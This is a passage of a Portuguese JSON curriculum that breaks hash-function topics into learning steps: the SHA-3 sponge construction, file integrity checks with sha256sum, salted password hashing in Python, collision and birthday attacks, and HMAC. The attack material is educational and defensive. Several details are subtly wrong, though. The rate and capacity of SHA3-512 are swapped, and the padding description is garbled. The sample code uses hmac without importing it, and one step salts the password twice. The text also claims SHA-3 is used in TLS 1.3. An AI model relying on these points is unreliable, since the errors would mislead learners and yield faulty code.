                                    "Visualizar com diagrama: estado como 'esponja' que absorve bits e expele hash.",
                                    "Comparar com estruturas tradicionais como Merkle-Damgård.",
                                    "Simular manualmente um ciclo simples de absorção/espremedura com números pequenos."
                                  ],
                                  "verification": "Desenhar e rotular um diagrama de função de esponja mostrando absorção e squeeze.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Vídeo explicativo Keccak (YouTube ou NIST)",
                                    "Papel e caneta para diagrama",
                                    "Artigo 'The Keccak sponge function family'"
                                  ],
                                  "tips": "Pense na esponja como um balde: absorve água (dados) e espreme para fora (hash).",
                                  "learningObjective": "Compreender o paradigma de esponja como base para SHA-3.",
                                  "commonMistakes": [
                                    "Confundir taxa com capacidade",
                                    "Achar que esponja é só para hash (é flexível)",
                                    "Não relacionar r + c = 1600"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar SHA-3 como Padronização de Keccak",
                                  "subSteps": [
                                    "Discutir a competição NIST SHA-3 (2007-2012) e vitória do Keccak.",
                                    "Explicar parâmetros SHA-3: variantes de 224 a 512 bits, com r=1024, c=576 para SHA3-512.",
                                    "Detalhar padding 10*1: multiplica de 10, termina com 1, zeros, 1.",
                                    "Implementar hash simples de uma string curta usando biblioteca (ex: Python hashlib).",
                                    "Verificar output contra ferramenta online NIST."
                                  ],
                                  "verification": "Executar código Python para computar SHA3-256 de 'hello' e comparar com valor conhecido (result: 3338be694f50c5f338814986cdf0686453a888b84f424d792af4b9202398f392).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Python com hashlib",
                                    "Documentação NIST FIPS 202 (SHA-3)",
                                    "Ferramenta online como CyberChef"
                                  ],
                                  "tips": "Comece com strings curtas para depuração; use print para estados intermediários.",
                                  "learningObjective": "Saber como SHA-3 instancia Keccak e computá-lo praticamente.",
                                  "commonMistakes": [
                                    "Usar SHA-2 em vez de SHA-3 na biblioteca",
                                    "Errar padding (não 10*1)",
                                    "Ignorar diferenças de output length"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar SHA-3 com SHA-2 e Destacar Vantagens",
                                  "subSteps": [
                                    "Contrastar estruturas: Merkle-Damgård (SHA-2) vs Esponja (SHA-3).",
                                    "Demonstrar imunidade de SHA-3 a length extension: não usa comprimento no padding final.",
                                    "Testar length extension em SHA-256 vs SHA-3 com ferramenta ou código.",
                                    "Discutir performance: SHA-3 mais lento em software, mas melhor em hardware.",
                                    "Resumir benefícios: flexibilidade, resistência a colisões quânticas potenciais."
                                  ],
                                  "verification": "Gerar relatório com hashes SHA-2 e SHA-3 de mensagens relacionadas, mostrando falha de extensão em SHA-2.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CyberChef ou Python script para length extension demo",
                                    "Tabela comparativa template"
                                  ],
                                  "tips": "Use mensagem secreta + pública em HMAC para demo clara de ataque.",
                                  "learningObjective": "Diferenciar SHA-3 de SHA-2, enfatizando resistência a length extension.",
                                  "commonMistakes": [
                                    "Achar SHA-3 sempre mais rápido",
                                    "Não testar length extension",
                                    "Confundir Keccak com SHA-3 (SHA-3 é subset)"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Python hashlib, compute SHA3-256('minha_chave_secreta') e tente estender com dados públicos: SHA-3 resiste, enquanto SHA-256 permite extensão maliciosa, simulando ataque em API signatures.",
                              "finalVerifications": [
                                "Explicar função de esponja em 2 frases.",
                                "Computar SHA3-256 de string dada e verificar.",
                                "Demonstrar length extension em SHA-256 mas não em SHA-3.",
                                "Listar 3 diferenças chave entre SHA-2 e SHA-3.",
                                "Desenhar diagrama simples de Keccak sponge.",
                                "Identificar quando usar SHA-3 sobre SHA-2."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de esponja vs Merkle-Damgård (80%+ correto).",
                                "Correção em implementações de hash (matches NIST vectors).",
                                "Compreensão de length extension com demo funcional.",
                                "Diagrama claro e rotulado de componentes Keccak.",
                                "Análise de trade-offs (segurança vs performance).",
                                "Uso correto de terminologia (Keccak-f, taxa, capacidade)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra linear em permutações Keccak-f.",
                                "Programação: Implementação em Python/C para cripto.",
                                "Física/Engenharia: Otimização hardware para SHA-3.",
                                "História da Computação: Competição NIST SHA-3.",
                                "Ética: Implicações de vulnerabilidades em protocolos reais."
                              ],
                              "realWorldApplication": "SHA-3 é usado em blockchain (Ethereum 2.0), assinaturas digitais (NIST-approved), e protocolos TLS 1.3 para maior segurança contra extensões de mensagem em APIs e IoT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.3.3",
                        "name": "Aplicações e Vulnerabilidades das Funções Hash",
                        "description": "Usos práticos em verificação de integridade, armazenamento de senhas (com salt e pepper), assinaturas digitais e detecção de ataques como rainbow tables ou colisões forjadas.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.3.1",
                            "name": "Aplicar hash para verificação de integridade",
                            "description": "Calcular e comparar hashes de arquivos para detectar alterações, usando ferramentas como sha256sum ou openssl.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos de hash e verificação de integridade",
                                  "subSteps": [
                                    "Estude o que é uma função hash: uma transformação matemática que gera um valor fixo de tamanho a partir de qualquer entrada.",
                                    "Aprenda sobre propriedades: determinística, unidirecional, efeito avalanche e resistência a colisões.",
                                    "Entenda verificação de integridade: comparar hash original com hash atual para detectar alterações.",
                                    "Revise ferramentas: sha256sum (Linux/macOS) e openssl dgst -sha256 (multiplataforma).",
                                    "Crie um arquivo de teste simples (ex: echo 'teste' > original.txt)."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos chave e liste 2 diferenças entre MD5 e SHA-256.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação online de SHA-256",
                                    "Editor de texto",
                                    "Terminal"
                                  ],
                                  "tips": "Use analogia: hash é como impressão digital de um arquivo.",
                                  "learningObjective": "Dominar fundamentos teóricos para aplicação prática.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia simétrica",
                                    "Ignorar que hashes colidem teoricamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular hash inicial de um arquivo",
                                  "subSteps": [
                                    "Abra o terminal e navegue para o diretório com o arquivo original.txt.",
                                    "Execute sha256sum original.txt e anote o hash gerado.",
                                    "Alternativamente, use openssl dgst -sha256 original.txt e compare resultados.",
                                    "Salve o hash em um arquivo checksum.txt: echo 'hash_aqui original.txt' > checksum.txt.",
                                    "Verifique o comando sha256sum -c checksum.txt para validar."
                                  ],
                                  "verification": "O comando sha256sum -c checksum.txt retorna 'OK'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/macOS/Windows com Git Bash",
                                    "Arquivo original.txt"
                                  ],
                                  "tips": "Sempre use aspas em nomes de arquivos com espaços.",
                                  "learningObjective": "Executar cálculo de hash com precisão usando ferramentas padrão.",
                                  "commonMistakes": [
                                    "Copiar hash incorretamente",
                                    "Usar ferramenta errada sem verificar sintaxe"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular alteração e recalcular hash",
                                  "subSteps": [
                                    "Altere o arquivo: echo 'alterado' >> original.txt ou edite com nano/vi.",
                                    "Recalcule o hash: sha256sum original.txt e compare visualmente com o original.",
                                    "Use openssl dgst -sha256 original.txt para confirmação cruzada.",
                                    "Tente restaurar o arquivo e recalcular para ver hash original retornar.",
                                    "Documente as diferenças nos hashes antes/depois."
                                  ],
                                  "verification": "Hashes diferem após alteração e coincidem após restauração.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Arquivo original.txt alterado"
                                  ],
                                  "tips": "Pequenas mudanças geram hashes completamente diferentes (efeito avalanche).",
                                  "learningObjective": "Detectar mudanças via comparação de hashes.",
                                  "commonMistakes": [
                                    "Não alterar o arquivo o suficiente",
                                    "Comparar hashes manualmente sem anotar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar verificação em cenário realista",
                                  "subSteps": [
                                    "Baixe um arquivo oficial (ex: ISO do Ubuntu de ubuntu.com).",
                                    "Obtenha hash oficial do site e calcule localmente com sha256sum.",
                                    "Compare hashes; se igual, arquivo íntegro.",
                                    "Simule corrupção: altere bytes com hex editor e reverifique.",
                                    "Automatize com script bash simples: sha256sum -c checksums.txt."
                                  ],
                                  "verification": "Script ou comando confirma integridade de múltiplos arquivos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo ISO baixado",
                                    "Checksum oficial do site",
                                    "Hex editor opcional (xxd)"
                                  ],
                                  "tips": "Sempre baixe checksums de fontes confiáveis.",
                                  "learningObjective": "Integrar verificação de hash em fluxos de trabalho reais.",
                                  "commonMistakes": [
                                    "Baixar de mirror não oficial",
                                    "Ignorar case-sensitive em hashes"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe o instalador do Firefox de mozilla.org, calcule SHA-256 com sha256sum, compare com hash oficial no site. Altere o executável e reverifique para detectar tampering.",
                              "finalVerifications": [
                                "Hashes calculados coincidem com valores conhecidos para arquivos íntegros.",
                                "Qualquer alteração mínima resulta em hash completamente diferente.",
                                "Ferramentas sha256sum e openssl produzem resultados idênticos.",
                                "Script de verificação batch funciona sem erros.",
                                "Explicação oral correta de por que hashes detectam integridade."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de hash (100% match com esperado).",
                                "Detecção consistente de alterações em testes repetidos.",
                                "Uso correto de múltiplas ferramentas sem erros de sintaxe.",
                                "Documentação clara de hashes antes/depois.",
                                "Explicação teórica precisa em relatório final.",
                                "Tempo de execução dentro dos estimados."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Funções hash como funções modulares e propriedades algébricas.",
                                "Programação: Implementar hash em Python (hashlib) ou verificadores automatizados.",
                                "Ética em TI: Importância de integridade em software open-source.",
                                "Redes: Verificação de integridade em downloads via HTTPS."
                              ],
                              "realWorldApplication": "Verificar downloads de software/firmware para prevenir malware (ex: ISOs Linux, atualizações Windows); auditoria de logs em conformidade GDPR; detecção de adulteração em blockchain/forense digital."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.2.3.3.2",
                            "name": "Implementar hash de senhas com salt",
                            "description": "Explicar e demonstrar o uso de salt para prevenir ataques de tabela arco-íris, com exemplos em Python usando hashlib.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos de funções hash e salts",
                                  "subSteps": [
                                    "Estude o que é uma função hash: uma função unidirecional que transforma dados em uma string fixa de tamanho.",
                                    "Aprenda sobre ataques de tabela arco-íris (rainbow tables): pré-computados para reverter hashes comuns.",
                                    "Entenda o papel do salt: valor aleatório único adicionado à senha antes do hash para tornar cada hash único.",
                                    "Compare hash sem salt vs. com salt usando exemplos simples.",
                                    "Pesquise bibliotecas Python como hashlib e secrets para salts seguros."
                                  ],
                                  "verification": "Resuma em suas palavras os conceitos e explique por que salts previnem rainbow tables.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial do Python hashlib",
                                    "Artigos sobre rainbow tables"
                                  ],
                                  "tips": "Use diagramas visuais para ilustrar o processo de hashing com salt.",
                                  "learningObjective": "Dominar os fundamentos teóricos de hashing e salts para motivar sua implementação prática.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia reversível.",
                                    "Achar que salt é uma senha adicional em vez de um valor aleatório."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente Python e gerar salt aleatório",
                                  "subSteps": [
                                    "Instale Python 3.x e um editor como VS Code ou PyCharm.",
                                    "Importe as bibliotecas: import hashlib, import secrets, import os.",
                                    "Gere um salt aleatório usando secrets.token_bytes(16) ou os.urandom(16).",
                                    "Converta o salt para string base64 para armazenamento fácil.",
                                    "Teste a geração de salts únicos em um script simples."
                                  ],
                                  "verification": "Execute um script que gere 5 salts diferentes e confirme que são únicos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Python instalado",
                                    "Editor de código"
                                  ],
                                  "tips": "Sempre use secrets ou os para aleatoriedade criptograficamente segura, evite random.",
                                  "learningObjective": "Configurar corretamente o ambiente e gerar salts seguros e únicos.",
                                  "commonMistakes": [
                                    "Usar random.random() em vez de secrets para salt.",
                                    "Gerar salts fixos ou previsíveis."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar função de hashing de senha com salt",
                                  "subSteps": [
                                    "Crie uma função hash_password(password, salt) que concatene password + salt.",
                                    "Aplique hashlib.pbkdf2_hmac('sha256', password.encode() + salt, salt, 100000).",
                                    "Retorne o hash em formato base64 junto com o salt para armazenamento.",
                                    "Armazene em formato 'salt:hash' para facilitar recuperação.",
                                    "Teste hashing de senhas diferentes com o mesmo salt."
                                  ],
                                  "verification": "Hash de 'senha123' com salt gerado deve produzir um valor único e irreprodutível manualmente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Script Python de teste"
                                  ],
                                  "tips": "Use PBKDF2 ou bcrypt para iterações lentas contra brute-force.",
                                  "learningObjective": "Desenvolver uma função segura para hashear senhas com salt integrado.",
                                  "commonMistakes": [
                                    "Concatenar salt após password em vez de antes (inconsistente).",
                                    "Usar hashlib.sha256 direto sem iterações (rápido para ataques)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar verificação de senha e testar segurança",
                                  "subSteps": [
                                    "Crie função verify_password(stored, password): extraia salt do stored.",
                                    "Re-hash a password fornecida com o salt extraído e compare com o hash armazenado.",
                                    "Implemente um script de teste com registro e login simulados.",
                                    "Demonstre falha de rainbow table simulando hashes sem salt.",
                                    "Adicione logging para depuração e valide contra entradas inválidas."
                                  ],
                                  "verification": "Teste com senha correta (aceita) e incorreta (rejeita), confirme unicidade.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Script completo de teste"
                                  ],
                                  "tips": "Use hmac.compare_digest para comparação segura contra timing attacks.",
                                  "learningObjective": "Finalizar um sistema completo de autenticação hash-based com verificação.",
                                  "commonMistakes": [
                                    "Comparar strings diretamente (vulnerável a timing attacks).",
                                    "Não extrair salt corretamente do armazenamento."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um sistema simples de usuário:\n\n```python\nimport hashlib\nimport secrets\nimport base64\n\ndef hash_password(password):\n    salt = secrets.token_bytes(16)\n    pwdhash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)\n    return base64.b64encode(salt + pwdhash).decode('utf-8')\n\ndef verify_password(stored_password, provided_password):\n    salt_pwd = base64.b64decode(stored_password)\n    salt = salt_pwd[:16]\n    pwdhash = hashlib.pbkdf2_hmac('sha256', provided_password.encode(), salt, 100000)\n    return hmac.compare_digest(pwdhash, salt_pwd[16:])\n\n# Teste\nsenha = 'minhaSenha123'\nhashed = hash_password(senha)\nprint(verify_password(hashed, senha))  # True\nprint(verify_password(hashed, 'errada'))  # False\n```",
                              "finalVerifications": [
                                "Explica corretamente rainbow tables e como salt previne.",
                                "Gera salts únicos e hashs diferentes para mesmas senhas.",
                                "Funções de hash e verify funcionam sem erros.",
                                "Código resiste a testes de senha incorreta.",
                                "Identifica vulnerabilidades em hashing sem salt.",
                                "Usa bibliotecas seguras como PBKDF2."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de salt aleatório por senha.",
                                "Número de iterações alto (ex: 100000) para lentidão.",
                                "Comparação constante-time com compare_digest.",
                                "Tratamento de erros e validações de input.",
                                "Código limpo, comentado e modular.",
                                "Demonstração prática com exemplos de sucesso/falha."
                              ],
                              "crossCurricularConnections": [
                                "Programação Python: Manipulação de strings e bytes.",
                                "Matemática: Funções modulares e propriedades unidirecionais.",
                                "Ética e Direito: Privacidade de dados (LGPD/GDPR).",
                                "Desenvolvimento Web: Integração em frameworks como Flask/Django.",
                                "Análise de Dados: Detecção de padrões em ataques."
                              ],
                              "realWorldApplication": "Em aplicações web e mobile para armazenar senhas de usuários de forma segura, prevenindo vazamentos como o do LinkedIn (2012), onde hashes sem salt foram crackeados via rainbow tables. Usado em bancos, e-commerces e autenticação em APIs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.1.2",
                              "10.1.2.3.2.2"
                            ]
                          },
                          {
                            "id": "10.1.2.3.3.3",
                            "name": "Analisar ataques a funções hash",
                            "description": "Descrever ataques de colisão (ex: SHAttered para SHA-1), birthday attack e como mitigar com algoritmos mais fortes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Funções Hash e Colisões",
                                  "subSteps": [
                                    "Defina função hash e suas propriedades ideais (determinística, avalanche effect, resistência a pré-imagem).",
                                    "Explique o conceito de colisão em hashes: dois inputs diferentes produzindo o mesmo output.",
                                    "Discuta por que colisões são inevitáveis devido ao birthday paradox (espaço de saída finito).",
                                    "Revise exemplos de funções hash fracas como MD5 e SHA-1.",
                                    "Identifique impactos de colisões em aplicações como assinaturas digitais."
                                  ],
                                  "verification": "Resuma em um diagrama as propriedades de uma hash segura e dê um exemplo de colisão teórica.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Documentação NIST sobre hashes",
                                    "Artigo 'Birthday Attack' na Wikipedia",
                                    "Ferramenta online de hash como CyberChef"
                                  ],
                                  "tips": "Use analogias como 'caixas de correio' para visualizar colisões.",
                                  "learningObjective": "Entender as bases teóricas de funções hash e vulnerabilidades a colisões.",
                                  "commonMistakes": "Confundir colisão com pré-imagem; lembrar que colisão requer apenas dois inputs iguais no output."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Ataque de Colisão SHAttered em SHA-1",
                                  "subSteps": [
                                    "Pesquise o ataque SHAttered: dois PDFs com hashes SHA-1 idênticos mas conteúdos diferentes.",
                                    "Examine o método: construção diferencial usando liberdade de escolha em caminhos de compressão.",
                                    "Calcule o custo computacional: 2^63 operações de hash.",
                                    "Compare com SHA-1 original e demonstre por que falhou.",
                                    "Teste hashes de arquivos sample do projeto SHAttered."
                                  ],
                                  "verification": "Gere hashes de dois arquivos sample do SHAttered e confirme colisão usando ferramenta online.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Site oficial SHAttered.io",
                                    "Arquivos PDF sample do ataque",
                                    "Python com hashlib para testes"
                                  ],
                                  "tips": "Baixe os PDFs exatos do site para ver a colisão na prática.",
                                  "learningObjective": "Dominar um caso real de colisão prática em SHA-1.",
                                  "commonMistakes": "Ignorar que SHAttered é prático, não teórico; foque no impacto em certificados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Birthday Attack em Detalhes",
                                  "subSteps": [
                                    "Explique o Birthday Paradox: probabilidade de colisão em n amostras de um espaço de 365 dias.",
                                    "Aplique à criptografia: para hash de 128 bits, ~2^64 tentativas para colisão com probabilidade 50%.",
                                    "Implemente simulação simples em Python para demonstrar paradoxo.",
                                    "Discuta complexidade: O(sqrt(2 * k * N)) onde k é bits de saída.",
                                    "Analise ataques em MD5 usando rainbow tables ou GPUs."
                                  ],
                                  "verification": "Execute simulação Python e plote gráfico mostrando colisão após ~sqrt(N) tentativas.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Código Python para simulação birthday attack (GitHub repos)",
                                    "Biblioteca matplotlib para gráficos",
                                    "Artigo original de Yuval Birthday Attack"
                                  ],
                                  "tips": "Comece com N=365 para birthdays reais antes de escalar para hashes.",
                                  "learningObjective": "Compreender e simular o birthday attack probabilisticamente.",
                                  "commonMistakes": "Confundir com brute-force full; birthday é mais eficiente."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Mitigações com Algoritmos Mais Fortes",
                                  "subSteps": [
                                    "Compare SHA-256/SHA-3 com SHA-1: tamanhos maiores, estruturas diferentes (Merkle-Damgård vs Sponge).",
                                    "Discuta migração: políticas NIST descontinuando SHA-1.",
                                    "Analise HMAC e usos onde colisões ainda importam.",
                                    "Teste hashes em SHA-256 vs SHA-1 para mesmos inputs.",
                                    "Planeje estratégia de upgrade em sistemas legados."
                                  ],
                                  "verification": "Crie relatório comparando complexidade de ataques em SHA-1 vs SHA-256.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "NIST SP 800-131A Rev 2",
                                    "Documentação SHA-3 no FIPS 202",
                                    "CyberChef para comparações"
                                  ],
                                  "tips": "Verifique políticas atuais de browsers rejeitando SHA-1.",
                                  "learningObjective": "Identificar e justificar algoritmos resistentes a colisões.",
                                  "commonMistakes": "Achar SHA-256 imune; enfatize que requer monitoramento contínuo."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Análise e Simular Cenário Completo",
                                  "subSteps": [
                                    "Integre conhecimentos: monte timeline de ataques a hashes (MD5, SHA-1).",
                                    "Simule detecção de colisão em log de aplicação.",
                                    "Desenvolva checklist para auditoria de hashes em projetos.",
                                    "Debata trade-offs: performance vs segurança.",
                                    "Crie apresentação resumindo ataques e mitigações."
                                  ],
                                  "verification": "Apresente análise de um caso hipotético de colisão em app real.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Ferramentas como Wireshark para análise de tráfego",
                                    "Templates de relatório em Markdown"
                                  ],
                                  "tips": "Use casos reais como Flame malware explorando MD5.",
                                  "learningObjective": "Aplicar análise integrada a cenários de cibersegurança.",
                                  "commonMistakes": "Subestimar custos de migração; inclua exemplos econômicos."
                                }
                              ],
                              "practicalExample": "Simule um birthday attack em Python para encontrar colisão em hash de 16 bits: gere pares de números aleatórios até hash colidir, demonstrando ~2^8 tentativas em vez de 2^16 brute-force. Aplique a SHA-1 sample PDFs do SHAttered para verificar colisão real.",
                              "finalVerifications": [
                                "Explica corretamente SHAttered e gera hashes idênticos dos PDFs.",
                                "Simula birthday attack com código funcional e gráfico de probabilidade.",
                                "Lista 3 mitigações NIST para SHA-1 e justifica SHA-3.",
                                "Identifica colisão em log simulado de aplicação.",
                                "Compara complexidades de ataques em tabela.",
                                "Debate impactos em blockchain ou certificados SSL."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: descrições de ataques sem erros conceituais (40%).",
                                "Profundidade prática: simulações e exemplos executáveis (30%).",
                                "Análise crítica: mitigações justificadas com evidências (15%).",
                                "Clareza de comunicação: diagramas e resumos concisos (10%).",
                                "Conexões reais: cita casos como SHAttered ou Flame (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade e paradoxo birthday.",
                                "Programação: Implementação de simulações em Python/hashlib.",
                                "Ética: Implicações de vulnerabilidades em sistemas críticos.",
                                "Física/Computação: Custo computacional e hardware (GPUs para ataques)."
                              ],
                              "realWorldApplication": "Em certificados SSL/TLS, onde colisões SHA-1 permitiram falsificação de sites (ex: browsers rejeitaram SHA-1 em 2017); em blockchain para validar transações sem double-spending; auditorias de segurança em apps para detectar hashes fracos em senhas ou arquivos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.2.1",
                              "10.1.2.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.2.3.3.4",
                            "name": "Usar HMAC para integridade e autenticação",
                            "description": "Explicar Hash-based Message Authentication Code (HMAC) como combinação de hash com chave secreta para prevenir forjarias.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais de HMAC",
                                  "subSteps": [
                                    "Defina HMAC como Hash-based Message Authentication Code, uma função de autenticação de mensagens baseada em hash com chave secreta.",
                                    "Explique a diferença entre hash simples (MD5, SHA-256) e HMAC: o último usa chave para prevenir forjarias.",
                                    "Identifique os objetivos: garantir integridade (não alterada) e autenticação (origem legítima).",
                                    "Compare com MAC genérico e destaque por que HMAC é preferido (segurança comprovada)."
                                  ],
                                  "verification": "Resuma em suas palavras o que é HMAC e seus benefícios em um parágrafo curto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação RFC 2104 sobre HMAC",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Use analogias: hash simples é como uma fechadura sem chave; HMAC adiciona a chave secreta."
                                  ],
                                  "learningObjective": "Entender a definição, propósito e vantagens do HMAC sobre hashes simples.",
                                  "commonMistakes": [
                                    "Confundir HMAC com criptografia simétrica (HMAC não cifra, apenas autentica).",
                                    "Ignorar a necessidade de chave secreta compartilhada."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar o algoritmo e funcionamento interno do HMAC",
                                  "subSteps": [
                                    "Aprenda a fórmula: HMAC(K, m) = H((K XOR opad) || H((K XOR ipad) || m)), onde H é a função hash, opad/ipad são constantes.",
                                    "Entenda o padding: ipad (0x36) e opad (0x5C) para misturar a chave com o hash.",
                                    "Analise por que isso previne ataques de extensão de comprimento e colisões.",
                                    "Revise exemplos com SHA-256: calcule manualmente um HMAC simples com chave curta.",
                                    "Estude vulnerabilidades se a chave for fraca ou reutilizada."
                                  ],
                                  "verification": "Desenhe o diagrama do algoritmo HMAC e explique cada parte em voz alta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta online de calculadora HMAC (ex: hmac.online)",
                                    "Papel e caneta para diagramas"
                                  ],
                                  "tips": [
                                    "Memorize ipad/opad como 'inner' e 'outer' padding para fixar a estrutura aninhada."
                                  ],
                                  "learningObjective": "Dominar o algoritmo HMAC e como ele garante segurança contra manipulações.",
                                  "commonMistakes": [
                                    "Esquecer o XOR com opad/ipad, achando que é só concatenação.",
                                    "Usar chaves maiores que o tamanho do bloco sem truncar adequadamente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar HMAC em código prático",
                                  "subSteps": [
                                    "Instale biblioteca: em Python, use hmac e hashlib.",
                                    "Escreva função para gerar HMAC: hmac.new(chave, mensagem, hashlib.sha256).hexdigest().",
                                    "Teste com mensagem e chave fixas, compare com calculadora online.",
                                    "Implemente verificação: gere HMAC e valide com uma mensagem alterada (deve falhar).",
                                    "Adicione tratamento de erros para chaves inválidas ou hashes não suportados."
                                  ],
                                  "verification": "Execute o código e mostre saída correta para mensagem original e falha na alterada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Python 3+ instalado",
                                    "Editor de código (VS Code ou Jupyter)",
                                    "Bibliotecas: pip install cryptography (opcional)"
                                  ],
                                  "tips": [
                                    "Sempre use chaves binárias (bytes) em Python para evitar erros de encoding."
                                  ],
                                  "learningObjective": "Implementar HMAC programaticamente para autenticação de mensagens.",
                                  "commonMistakes": [
                                    "Passar strings em vez de bytes para chave/mensagem.",
                                    "Não usar digest() ou hexdigest() corretamente."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e aplicar HMAC em cenários de integridade",
                                  "subSteps": [
                                    "Crie script para assinar arquivo: leia conteúdo, gere HMAC e anexe.",
                                    "Simule ataque: altere arquivo e verifique falha na validação.",
                                    "Integre em API simples: use Flask para endpoint que valida HMAC em headers.",
                                    "Discuta rotação de chaves e armazenamento seguro.",
                                    "Analise performance: meça tempo para mensagens grandes."
                                  ],
                                  "verification": "Demonstre sucesso na validação original e falha na tamperada via código rodando.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Python com Flask (pip install flask)",
                                    "Postman para testar API"
                                  ],
                                  "tips": [
                                    "Armazene HMAC em header 'Authorization' como em APIs reais."
                                  ],
                                  "learningObjective": "Aplicar HMAC em contextos reais para detectar forjarias.",
                                  "commonMistakes": [
                                    "Reutilizar HMAC para múltiplas mensagens sem nonce.",
                                    "Expor chave secreta no código fonte."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de pagamento, gere HMAC da mensagem 'transacao=100&user=123' com chave secreta 'minha_chave_secreta' usando SHA-256. Envie como header 'X-HMAC-Signature'. No servidor, recalcule HMAC da mensagem recebida e compare: se igual, processe; senão, rejeite como forjada.",
                              "finalVerifications": [
                                "Explique HMAC sem consultar notas.",
                                "Implemente HMAC em Python para nova mensagem e valide.",
                                "Identifique falha em HMAC com chave vazia.",
                                "Descreva ataque de colisão e como HMAC mitiga.",
                                "Crie diagrama do algoritmo HMAC.",
                                "Teste HMAC em arquivo de 1MB sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação do algoritmo (fórmula e padding corretos).",
                                "Código funcional sem erros de encoding ou tipos.",
                                "Validação correta de integridade em testes de tampering.",
                                "Uso adequado de boas práticas (chaves seguras, hashes fortes).",
                                "Análise de performance e limitações identificadas.",
                                "Conexão clara com conceitos de criptografia."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações XOR e funções hash probabilísticas.",
                                "Programação: Manipulação de bytes e bibliotecas criptográficas (Python hmac).",
                                "Redes: Autenticação em protocolos HTTP/HTTPS e APIs REST.",
                                "Ética e Direito: Conformidade com LGPD/GDPR em proteção de dados.",
                                "Sistemas Operacionais: Armazenamento seguro de chaves (Keychain/Keystore)."
                              ],
                              "realWorldApplication": "HMAC é essencial em tokens JWT para autenticação de usuários, assinaturas de commits no Git, validação de integridade em atualizações de software (ex: Docker images), e protocolos como TLS para handshake seguro, prevenindo ataques man-in-the-middle em transações bancárias e comunicações IoT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.3.3.1"
                            ]
                          }
                        ]
                      }
